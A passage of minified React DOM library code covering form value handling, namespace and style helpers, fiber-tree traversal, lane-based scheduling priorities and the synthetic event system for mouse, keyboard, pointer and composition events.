}
var Zr = Array.isArray;
function cr(e, t, n, r) {
  if (e = e.options, t) {
    t = {};
    for (var o = 0; o < n.length; o++) t["$" + n[o]] = !0;
    for (n = 0; n < e.length; n++) o = t.hasOwnProperty("$" + e[n].value), e[n].selected !== o && (e[n].selected = o), o && r && (e[n].defaultSelected = !0);
  } else {
    for (n = "" + ln(n), t = null, o = 0; o < e.length; o++) {
      if (e[o].value === n) return e[o].selected = !0, void (r && (e[o].defaultSelected = !0));
      null !== t || e[o].disabled || (t = e[o]);
    }
    null !== t && (t.selected = !0);
  }
}
function Js(e, t) {
  if (null != t.dangerouslySetInnerHTML) throw Error(N(91));
  return le({}, t, {
    value: void 0,
    defaultValue: void 0,
    children: "" + e._wrapperState.initialValue
  });
}
function Bc(e, t) {
  var n = t.value;
  if (null == n) {
    if (n = t.children, t = t.defaultValue, null != n) {
      if (null != t) throw Error(N(92));
      if (Zr(n)) {
        if (1 < n.length) throw Error(N(93));
        n = n[0];
      }
      t = n;
    }
    null == t && (t = ""), n = t;
  }
  e._wrapperState = {
    initialValue: ln(n)
  };
}
function cp(e, t) {
  var n = ln(t.value),
    r = ln(t.defaultValue);
  null != n && ((n = "" + n) !== e.value && (e.value = n), null == t.defaultValue && e.defaultValue !== n && (e.defaultValue = n)), null != r && (e.defaultValue = "" + r);
}
function Vc(e) {
  var t = e.textContent;
  t === e._wrapperState.initialValue && "" !== t && null !== t && (e.value = t);
}
function dp(e) {
  switch (e) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml";
  }
}
function qs(e, t) {
  return null == e || "http://www.w3.org/1999/xhtml" === e ? dp(t) : "http://www.w3.org/2000/svg" === e && "foreignObject" === t ? "http://www.w3.org/1999/xhtml" : e;
}
var Jo,
  fp = function (e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function (t, n, r, o) {
      MSApp.execUnsafeLocalFunction(function () {
        return e(t, n);
      });
    } : e;
  }(function (e, t) {
    if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML" in e) e.innerHTML = t;else {
      for ((Jo = Jo || document.createElement("div")).innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = Jo.firstChild; e.firstChild;) e.removeChild(e.firstChild);
      for (; t.firstChild;) e.appendChild(t.firstChild);
    }
  });
function po(e, t) {
  if (t) {
    var n = e.firstChild;
    if (n && n === e.lastChild && 3 === n.nodeType) return void (n.nodeValue = t);
  }
  e.textContent = t;
}
var eo = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0
  },
  hy = ["Webkit", "ms", "Moz", "O"];
function pp(e, t, n) {
  return null == t || "boolean" == typeof t || "" === t ? "" : n || "number" != typeof t || 0 === t || eo.hasOwnProperty(e) && eo[e] ? ("" + t).trim() : t + "px";
}
function mp(e, t) {
  for (var n in e = e.style, t) if (t.hasOwnProperty(n)) {
    var r = 0 === n.indexOf("--"),
      o = pp(n, t[n], r);
    "float" === n && (n = "cssFloat"), r ? e.setProperty(n, o) : e[n] = o;
  }
}
Object.keys(eo).forEach(function (e) {
  hy.forEach(function (t) {
    t = t + e.charAt(0).toUpperCase() + e.substring(1), eo[t] = eo[e];
  });
});
var gy = le({
  menuitem: !0
}, {
  area: !0,
  base: !0,
  br: !0,
  col: !0,
  embed: !0,
  hr: !0,
  img: !0,
  input: !0,
  keygen: !0,
  link: !0,
  meta: !0,
  param: !0,
  source: !0,
  track: !0,
  wbr: !0
});
function ea(e, t) {
  if (t) {
    if (gy[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(N(137, e));
    if (null != t.dangerouslySetInnerHTML) {
      if (null != t.children) throw Error(N(60));
      if ("object" != typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(N(61));
    }
    if (null != t.style && "object" != typeof t.style) throw Error(N(62));
  }
}
function ta(e, t) {
  if (-1 === e.indexOf("-")) return "string" == typeof t.is;
  switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0;
  }
}
var na = null;
function wu(e) {
  return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e;
}
var ra = null,
  dr = null,
  fr = null;
function Hc(e) {
  if (e = zo(e)) {
    if ("function" != typeof ra) throw Error(N(280));
    var t = e.stateNode;
    t && (t = bl(t), ra(e.stateNode, e.type, t));
  }
}
function vp(e) {
  dr ? fr ? fr.push(e) : fr = [e] : dr = e;
}
function hp() {
  if (dr) {
    var e = dr,
      t = fr;
    if (fr = dr = null, Hc(e), t) for (e = 0; e < t.length; e++) Hc(t[e]);
  }
}
function gp(e, t) {
  return e(t);
}
function yp() {}
var es = !1;
function wp(e, t, n) {
  if (es) return e(t, n);
  es = !0;
  try {
    return gp(e, t, n);
  } finally {
    es = !1, (null !== dr || null !== fr) && (yp(), hp());
  }
}
function mo(e, t) {
  var n = e.stateNode;
  if (null === n) return null;
  var r = bl(n);
  if (null === r) return null;
  n = r[t];
  e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !r;
      break e;
    default:
      e = !1;
  }
  if (e) return null;
  if (n && "function" != typeof n) throw Error(N(231, t, typeof n));
  return n;
}
var oa = !1;
if (Nt) try {
  var Fr = {};
  Object.defineProperty(Fr, "passive", {
    get: function () {
      oa = !0;
    }
  }), window.addEventListener("test", Fr, Fr), window.removeEventListener("test", Fr, Fr);
} catch {
  oa = !1;
}
function yy(e, t, n, r, o, i, l, s, a) {
  var u = Array.prototype.slice.call(arguments, 3);
  try {
    t.apply(n, u);
  } catch (d) {
    this.onError(d);
  }
}
var to = !1,
  Wi = null,
  Bi = !1,
  ia = null,
  wy = {
    onError: function (e) {
      to = !0, Wi = e;
    }
  };
function xy(e, t, n, r, o, i, l, s, a) {
  to = !1, Wi = null, yy.apply(wy, arguments);
}
function Sy(e, t, n, r, o, i, l, s, a) {
  if (xy.apply(this, arguments), to) {
    if (!to) throw Error(N(198));
    var u = Wi;
    to = !1, Wi = null, Bi || (Bi = !0, ia = u);
  }
}
function Fn(e) {
  var t = e,
    n = e;
  if (e.alternate) for (; t.return;) t = t.return;else {
    e = t;
    do {
      4098 & (t = e).flags && (n = t.return), e = t.return;
    } while (e);
  }
  return 3 === t.tag ? n : null;
}
function xp(e) {
  if (13 === e.tag) {
    var t = e.memoizedState;
    if (null === t && null !== (e = e.alternate) && (t = e.memoizedState), null !== t) return t.dehydrated;
  }
  return null;
}
function Kc(e) {
  if (Fn(e) !== e) throw Error(N(188));
}
function Ey(e) {
  var t = e.alternate;
  if (!t) {
    if (null === (t = Fn(e))) throw Error(N(188));
    return t !== e ? null : e;
  }
  for (var n = e, r = t;;) {
    var o = n.return;
    if (null === o) break;
    var i = o.alternate;
    if (null === i) {
      if (null !== (r = o.return)) {
        n = r;
        continue;
      }
      break;
    }
    if (o.child === i.child) {
      for (i = o.child; i;) {
        if (i === n) return Kc(o), e;
        if (i === r) return Kc(o), t;
        i = i.sibling;
      }
      throw Error(N(188));
    }
    if (n.return !== r.return) n = o, r = i;else {
      for (var l = !1, s = o.child; s;) {
        if (s === n) {
          l = !0, n = o, r = i;
          break;
        }
        if (s === r) {
          l = !0, r = o, n = i;
          break;
        }
        s = s.sibling;
      }
      if (!l) {
        for (s = i.child; s;) {
          if (s === n) {
            l = !0, n = i, r = o;
            break;
          }
          if (s === r) {
            l = !0, r = i, n = o;
            break;
          }
          s = s.sibling;
        }
        if (!l) throw Error(N(189));
      }
    }
    if (n.alternate !== r) throw Error(N(190));
  }
  if (3 !== n.tag) throw Error(N(188));
  return n.stateNode.current === n ? e : t;
}
function Sp(e) {
  return null !== (e = Ey(e)) ? Ep(e) : null;
}
function Ep(e) {
  if (5 === e.tag || 6 === e.tag) return e;
  for (e = e.child; null !== e;) {
    var t = Ep(e);
    if (null !== t) return t;
    e = e.sibling;
  }
  return null;
}
var Cp = Be.unstable_scheduleCallback,
  Gc = Be.unstable_cancelCallback,
  Cy = Be.unstable_shouldYield,
  ky = Be.unstable_requestPaint,
  ae = Be.unstable_now,
  Py = Be.unstable_getCurrentPriorityLevel,
  xu = Be.unstable_ImmediatePriority,
  kp = Be.unstable_UserBlockingPriority,
  Vi = Be.unstable_NormalPriority,
  _y = Be.unstable_LowPriority,
  Pp = Be.unstable_IdlePriority,
  Cl = null,
  yt = null;
function by(e) {
  if (yt && "function" == typeof yt.onCommitFiberRoot) try {
    yt.onCommitFiberRoot(Cl, e, void 0, !(128 & ~e.current.flags));
  } catch {}
}
var lt = Math.clz32 ? Math.clz32 : Ry,
  Ny = Math.log,
  $y = Math.LN2;
function Ry(e) {
  return 0 === (e >>>= 0) ? 32 : 31 - (Ny(e) / $y | 0) | 0;
}
var qo = 64,
  ei = 4194304;
function Jr(e) {
  switch (e & -e) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return 4194240 & e;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return 130023424 & e;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return e;
  }
}
function Hi(e, t) {
  var n = e.pendingLanes;
  if (0 === n) return 0;
  var r = 0,
    o = e.suspendedLanes,
    i = e.pingedLanes,
    l = 268435455 & n;
  if (0 !== l) {
    var s = l & ~o;
    0 !== s ? r = Jr(s) : 0 !== (i &= l) && (r = Jr(i));
  } else 0 !== (l = n & ~o) ? r = Jr(l) : 0 !== i && (r = Jr(i));
  if (0 === r) return 0;
  if (0 !== t && t !== r && !(t & o) && ((o = r & -r) >= (i = t & -t) || 16 === o && 4194240 & i)) return t;
  if (4 & r && (r |= 16 & n), 0 !== (t = e.entangledLanes)) for (e = e.entanglements, t &= r; 0 < t;) o = 1 << (n = 31 - lt(t)), r |= e[n], t &= ~o;
  return r;
}
function Oy(e, t) {
  switch (e) {
    case 1:
    case 2:
    case 4:
      return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return t + 5e3;
    default:
      return -1;
  }
}
function Ay(e, t) {
  for (var n = e.suspendedLanes, r = e.pingedLanes, o = e.expirationTimes, i = e.pendingLanes; 0 < i;) {
    var l = 31 - lt(i),
      s = 1 << l,
      a = o[l];
    -1 === a ? (!(s & n) || s & r) && (o[l] = Oy(s, t)) : a <= t && (e.expiredLanes |= s), i &= ~s;
  }
}
function la(e) {
  return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0;
}
function _p() {
  var e = qo;
  return !(4194240 & (qo <<= 1)) && (qo = 64), e;
}
function ts(e) {
  for (var t = [], n = 0; 31 > n; n++) t.push(e);
  return t;
}
function Lo(e, t, n) {
  e.pendingLanes |= t, 536870912 !== t && (e.suspendedLanes = 0, e.pingedLanes = 0), (e = e.eventTimes)[t = 31 - lt(t)] = n;
}
function Ty(e, t) {
  var n = e.pendingLanes & ~t;
  e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
  var r = e.eventTimes;
  for (e = e.expirationTimes; 0 < n;) {
    var o = 31 - lt(n),
      i = 1 << o;
    t[o] = 0, r[o] = -1, e[o] = -1, n &= ~i;
  }
}
function Su(e, t) {
  var n = e.entangledLanes |= t;
  for (e = e.entanglements; n;) {
    var r = 31 - lt(n),
      o = 1 << r;
    o & t | e[r] & t && (e[r] |= t), n &= ~o;
  }
}
var G = 0;
function bp(e) {
  return 1 < (e &= -e) ? 4 < e ? 268435455 & e ? 16 : 536870912 : 4 : 1;
}
var Np,
  Eu,
  $p,
  Rp,
  Op,
  sa = !1,
  ti = [],
  Zt = null,
  Jt = null,
  qt = null,
  vo = new Map(),
  ho = new Map(),
  Kt = [],
  Dy = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
function Qc(e, t) {
  switch (e) {
    case "focusin":
    case "focusout":
      Zt = null;
      break;
    case "dragenter":
    case "dragleave":
      Jt = null;
      break;
    case "mouseover":
    case "mouseout":
      qt = null;
      break;
    case "pointerover":
    case "pointerout":
      vo.delete(t.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      ho.delete(t.pointerId);
  }
}
function Ur(e, t, n, r, o, i) {
  return null === e || e.nativeEvent !== i ? (e = {
    blockedOn: t,
    domEventName: n,
    eventSystemFlags: r,
    nativeEvent: i,
    targetContainers: [o]
  }, null !== t && null !== (t = zo(t)) && Eu(t), e) : (e.eventSystemFlags |= r, t = e.targetContainers, null !== o && -1 === t.indexOf(o) && t.push(o), e);
}
function Iy(e, t, n, r, o) {
  switch (t) {
    case "focusin":
      return Zt = Ur(Zt, e, t, n, r, o), !0;
    case "dragenter":
      return Jt = Ur(Jt, e, t, n, r, o), !0;
    case "mouseover":
      return qt = Ur(qt, e, t, n, r, o), !0;
    case "pointerover":
      var i = o.pointerId;
      return vo.set(i, Ur(vo.get(i) || null, e, t, n, r, o)), !0;
    case "gotpointercapture":
      return i = o.pointerId, ho.set(i, Ur(ho.get(i) || null, e, t, n, r, o)), !0;
  }
  return !1;
}
function Ap(e) {
  var t = Sn(e.target);
  if (null !== t) {
    var n = Fn(t);
    if (null !== n) if (13 === (t = n.tag)) {
      if (null !== (t = xp(n))) return e.blockedOn = t, void Op(e.priority, function () {
        $p(n);
      });
    } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void (e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null);
  }
  e.blockedOn = null;
}
function _i(e) {
  if (null !== e.blockedOn) return !1;
  for (var t = e.targetContainers; 0 < t.length;) {
    var n = aa(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
    if (null !== n) return null !== (t = zo(n)) && Eu(t), e.blockedOn = n, !1;
    var r = new (n = e.nativeEvent).constructor(n.type, n);
    na = r, n.target.dispatchEvent(r), na = null, t.shift();
  }
  return !0;
}
function Yc(e, t, n) {
  _i(e) && n.delete(t);
}
function My() {
  sa = !1, null !== Zt && _i(Zt) && (Zt = null), null !== Jt && _i(Jt) && (Jt = null), null !== qt && _i(qt) && (qt = null), vo.forEach(Yc), ho.forEach(Yc);
}
function Wr(e, t) {
  e.blockedOn === t && (e.blockedOn = null, sa || (sa = !0, Be.unstable_scheduleCallback(Be.unstable_NormalPriority, My)));
}
function go(e) {
  function t(o) {
    return Wr(o, e);
  }
  if (0 < ti.length) {
    Wr(ti[0], e);
    for (var n = 1; n < ti.length; n++) {
      var r = ti[n];
      r.blockedOn === e && (r.blockedOn = null);
    }
  }
  for (null !== Zt && Wr(Zt, e), null !== Jt && Wr(Jt, e), null !== qt && Wr(qt, e), vo.forEach(t), ho.forEach(t), n = 0; n < Kt.length; n++) (r = Kt[n]).blockedOn === e && (r.blockedOn = null);
  for (; 0 < Kt.length && null === (n = Kt[0]).blockedOn;) Ap(n), null === n.blockedOn && Kt.shift();
}
var pr = Lt.ReactCurrentBatchConfig,
  Ki = !0;
function Ly(e, t, n, r) {
  var o = G,
    i = pr.transition;
  pr.transition = null;
  try {
    G = 1, Cu(e, t, n, r);
  } finally {
    G = o, pr.transition = i;
  }
}
function jy(e, t, n, r) {
  var o = G,
    i = pr.transition;
  pr.transition = null;
  try {
    G = 4, Cu(e, t, n, r);
  } finally {
    G = o, pr.transition = i;
  }
}
function Cu(e, t, n, r) {
  if (Ki) {
    var o = aa(e, t, n, r);
    if (null === o) ds(e, t, r, Gi, n), Qc(e, r);else if (Iy(o, e, t, n, r)) r.stopPropagation();else if (Qc(e, r), 4 & t && -1 < Dy.indexOf(e)) {
      for (; null !== o;) {
        var i = zo(o);
        if (null !== i && Np(i), null === (i = aa(e, t, n, r)) && ds(e, t, r, Gi, n), i === o) break;
        o = i;
      }
      null !== o && r.stopPropagation();
    } else ds(e, t, r, null, n);
  }
}
var Gi = null;
function aa(e, t, n, r) {
  if (Gi = null, null !== (e = Sn(e = wu(r)))) if (null === (t = Fn(e))) e = null;else if (13 === (n = t.tag)) {
    if (null !== (e = xp(t))) return e;
    e = null;
  } else if (3 === n) {
    if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
    e = null;
  } else t !== e && (e = null);
  return Gi = e, null;
}
function Tp(e) {
  switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (Py()) {
        case xu:
          return 1;
        case kp:
          return 4;
        case Vi:
        case _y:
          return 16;
        case Pp:
          return 536870912;
        default:
          return 16;
      }
    default:
      return 16;
  }
}
var Yt = null,
  ku = null,
  bi = null;
function Dp() {
  if (bi) return bi;
  var e,
    r,
    t = ku,
    n = t.length,
    o = "value" in Yt ? Yt.value : Yt.textContent,
    i = o.length;
  for (e = 0; e < n && t[e] === o[e]; e++);
  var l = n - e;
  for (r = 1; r <= l && t[n - r] === o[i - r]; r++);
  return bi = o.slice(e, 1 < r ? 1 - r : void 0);
}
function Ni(e) {
  var t = e.keyCode;
  return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0;
}
function ni() {
  return !0;
}
function Xc() {
  return !1;
}
function Ge(e) {
  function t(n, r, o, i, l) {
    for (var s in this._reactName = n, this._targetInst = o, this.type = r, this.nativeEvent = i, this.target = l, this.currentTarget = null, e) e.hasOwnProperty(s) && (n = e[s], this[s] = n ? n(i) : i[s]);
    return this.isDefaultPrevented = (null != i.defaultPrevented ? i.defaultPrevented : !1 === i.returnValue) ? ni : Xc, this.isPropagationStopped = Xc, this;
  }
  return le(t.prototype, {
    preventDefault: function () {
      this.defaultPrevented = !0;
      var n = this.nativeEvent;
      n && (n.preventDefault ? n.preventDefault() : "unknown" != typeof n.returnValue && (n.returnValue = !1), this.isDefaultPrevented = ni);
    },
    stopPropagation: function () {
      var n = this.nativeEvent;
      n && (n.stopPropagation ? n.stopPropagation() : "unknown" != typeof n.cancelBubble && (n.cancelBubble = !0), this.isPropagationStopped = ni);
    },
    persist: function () {},
    isPersistent: ni
  }), t;
}
var ns,
  rs,
  Br,
  Ar = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (e) {
      return e.timeStamp || Date.now();
    },
    defaultPrevented: 0,
    isTrusted: 0
  },
  Pu = Ge(Ar),
  jo = le({}, Ar, {
    view: 0,
    detail: 0
  }),
  zy = Ge(jo),
  kl = le({}, jo, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: _u,
    button: 0,
    buttons: 0,
    relatedTarget: function (e) {
      return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget;
    },
    movementX: function (e) {
      return "movementX" in e ? e.movementX : (e !== Br && (Br && "mousemove" === e.type ? (ns = e.screenX - Br.screenX, rs = e.screenY - Br.screenY) : rs = ns = 0, Br = e), ns);
    },
    movementY: function (e) {
      return "movementY" in e ? e.movementY : rs;
    }
  }),
  Zc = Ge(kl),
  Fy = le({}, kl, {
    dataTransfer: 0
  }),
  Uy = Ge(Fy),
  Wy = le({}, jo, {
    relatedTarget: 0
  }),
  os = Ge(Wy),
  By = le({}, Ar, {
    animationName: 0,
    elapsedTime: 0,
    pseudoElement: 0
  }),
  Vy = Ge(By),
  Hy = le({}, Ar, {
    clipboardData: function (e) {
      return "clipboardData" in e ? e.clipboardData : window.clipboardData;
    }
  }),
  Ky = Ge(Hy),
  Gy = le({}, Ar, {
    data: 0
  }),
  Jc = Ge(Gy),
  Qy = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified"
  },
  Yy = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta"
  },
  Xy = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey"
  };
function Zy(e) {
  var t = this.nativeEvent;
  return t.getModifierState ? t.getModifierState(e) : !!(e = Xy[e]) && !!t[e];
}
function _u() {
  return Zy;
}
var Jy = le({}, jo, {
    key: function (e) {
      if (e.key) {
        var t = Qy[e.key] || e.key;
        if ("Unidentified" !== t) return t;
      }
      return "keypress" === e.type ? 13 === (e = Ni(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? Yy[e.keyCode] || "Unidentified" : "";
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: _u,
    charCode: function (e) {
      return "keypress" === e.type ? Ni(e) : 0;
    },
    keyCode: function (e) {
      return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
    },
    which: function (e) {
      return "keypress" === e.type ? Ni(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
    }
  }),
  qy = Ge(Jy),
  e0 = le({}, kl, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0
  }),
  qc = Ge(e0),
  t0 = le({}, jo, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: _u
  }),
  n0 = Ge(t0),
  r0 = le({}, Ar, {
    propertyName: 0,
    elapsedTime: 0,
    pseudoElement: 0
  }),
  o0 = Ge(r0),
  i0 = le({}, kl, {
    deltaX: function (e) {
      return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
    },
    deltaY: function (e) {
      return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0;
    },
    deltaZ: 0,
    deltaMode: 0
  }),
  l0 = Ge(i0),
  s0 = [9, 13, 27, 32],
  bu = Nt && "CompositionEvent" in window,
  no = null;
Nt && "documentMode" in document && (no = document.documentMode);
var a0 = Nt && "TextEvent" in window && !no,
  Ip = Nt && (!bu || no && 8 < no && 11 >= no),
  ed = " ",
  td = !1;
function Mp(e, t) {
  switch (e) {
    case "keyup":
      return -1 !== s0.indexOf(t.keyCode);
    case "keydown":
      return 229 !== t.keyCode;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
    default:
      return !1;
  }
}
function Lp(e) {
  return "object" == typeof (e = e.detail) && "data" in e ? e.data : null;
}
var er = !1;
function u0(e, t) {
  switch (e) {
    case "compositionend":
      return Lp(t);
    case "keypress":
      return 32 !== t.which ? null : (td = !0, ed);
    case "textInput":
      return (e = t.data) === ed && td ? null : e;
    default:
      return null;
  }
}
function c0(e, t) {
  if (er) return "compositionend" === e || !bu && Mp(e, t) ? (e = Dp(), bi = ku = Yt = null, er = !1, e) : null;
  switch (e) {
    case "paste":
    default:
      return null;
    case "keypress":
      if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
        if (t.char && 1 < t.char.length) return t.char;
        if (t.which) return String.fromCharCode(t.which);
      }
      return null;
    case "compositionend":
      return Ip && "ko" !== t.locale ? null : t.data;
  }
}
var d0 = {
  color: !0,
  date: !0,
  datetime: !0,
  "datetime-local": !0,
  email: !0,
  month: !0,
  number: !0,
  password: !0,
  range: !0,
  search: !0,
  tel: !0,
  text: !0,
  time: !0,
  url: !0,
  week: !0
};
function nd(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return "input" === t ? !!d0[e.type] : "textarea" === t;
}
function jp(e, t, n, r) {
  vp(r), 0 < (t = Qi(t, "onChange")).length && (n = new Pu("onChange", "change", null, n, r), e.push({
    event: n,
    listeners: t
  }));
}
var ro = null,
  yo = null;
function f0(e) {
  Yp(e, 0);
}
function Pl(e) {
  if (ap(rr(e))) return e;
}
function p0(e, t) {
  if ("change" === e) return t;
}
var zp = !1;
if (Nt) {
  var is;
  if (Nt) {
    var ls = "oninput" in document;
    if (!ls) {
      var rd = document.createElement("div");
      rd.setAttribute("oninput", "return;"), ls = "function" == typeof rd.oninput;
    }
    is = ls;
  } else is = !1;
  zp = is && (!document.documentMode || 9 < document.documentMode);
}
function od() {
  ro && (ro.detachEvent("onpropertychange", Fp), yo = ro = null);
}
function Fp(e) {
  if ("value" === e.propertyName && Pl(yo)) {
    var t = [];
    jp(t, yo, e, wu(e)), wp(f0, t);
  }
}
function m0(e, t, n) {
  "focusin" === e ? (od(), yo = n, (ro = t).attachEvent("onpropertychange", Fp)) : "focusout" === e && od();
}
function v0(e) {
  if ("selectionchange" === e || "keyup" === e || "keydown" === e) return Pl(yo);
}
function h0(e, t) {
  if ("click" === e) return Pl(t);
}
function g0(e, t) {
  if ("input" === e || "change" === e) return Pl(t);
}
function y0(e, t) {
  return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t;
}
var at = "function" == typeof Object.is ? Object.is : y0;
function wo(e, t) {
  if (at(e, t)) return !0;
  if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
  var n = Object.keys(e),
    r = Object.keys(t);
  if (n.length !== r.length) return !1;
  for (r = 0; r < n.length; r++) {
    var o = n[r];
    if (!Vs.call(t, o) || !at(e[o], t[o])) return !1;
  }
  return !0;
}
function id(e) {
  for (; e && e.firstChild;) e = e.firstChild;
  return e;
}
function ld(e, t) {
  var r,
    n = id(e);
  for (e = 0; n;) {
    if (3 === n.nodeType) {
      if (r = e + n.textContent.length, e <= t && r >= t) return {
        node: n,
        offset: t - e
      };
      e = r;
    }
    e: {
      for (; n;) {
        if (n.nextSibling) {
          n = n.nextSibling;
          break e;
        }
